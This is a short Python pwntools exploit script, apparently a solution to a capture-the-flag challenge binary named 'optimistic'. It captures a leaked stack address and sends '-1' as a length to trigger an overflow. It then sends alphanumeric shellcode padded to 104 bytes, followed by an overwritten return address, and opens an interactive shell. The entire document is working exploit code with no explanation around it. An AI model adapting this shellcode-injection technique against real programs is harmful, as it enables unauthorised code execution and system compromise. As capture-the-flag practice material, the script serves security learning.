from pwn import *

io = process("./optimistic")

io.sendline(b'y')
io.recvuntil("Great! Here's a small welcome gift: ")
buffer_ad = int(io.recvline(), 16) - 96
io.sendline(b'AAAA')
print(io.recv())

io.sendline(b'6')
print(io.recv())
io.sendline(b'-1')
print(io.recv())

shellcode = b""
shellcode += b"XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V"
shellcode += b"0"*(104-len(shellcode))
shellcode += p64(buffer_ad)
io.sendline(shellcode)
io.interactive()